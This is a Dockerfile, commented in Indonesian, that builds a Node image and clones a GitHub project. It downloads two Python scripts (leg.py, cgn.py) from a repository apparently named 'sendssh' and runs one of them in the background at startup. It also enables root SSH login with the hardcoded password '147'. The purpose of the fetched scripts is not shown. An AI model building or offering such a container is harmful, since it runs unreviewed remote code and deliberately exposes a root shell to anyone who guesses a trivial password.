FROM node:20-bookworm

ENV DEBIAN_FRONTEND=noninteractive

# Install dependencies
RUN apt update && apt upgrade -y && apt install -y \
    openssh-server git wget sudo nano curl python3 python3-pip build-essential \
    && rm -rf /var/lib/apt/lists/*

# Clone repo
RUN git clone https://github.com/x011-al/nbwc

WORKDIR /nbwc

# Rebuild native addons (fix GLIBC & execstack issues)
RUN npm install --build-from-source || true

# Ambil file tambahan
RUN wget https://raw.githubusercontent.com/x011-al/sendssh/refs/heads/main/leg.py \
    && wget https://raw.githubusercontent.com/x011-al/sendssh/refs/heads/main/cgn.py

# Buat startup script
RUN mkdir /run/sshd \
    && echo "sleep 5" > /openssh.sh \
    && echo "python3 /nbwc/leg.py &" >> /openssh.sh \
    && echo "/usr/sbin/sshd -D" >> /openssh.sh \
    && echo "PermitRootLogin yes" >> /etc/ssh/sshd_config \
    && echo "root:147" | chpasswd \
    && chmod +x /openssh.sh

# Jalankan script pakai bash (anti 'exec format error')
CMD ["bash", "/openssh.sh"]
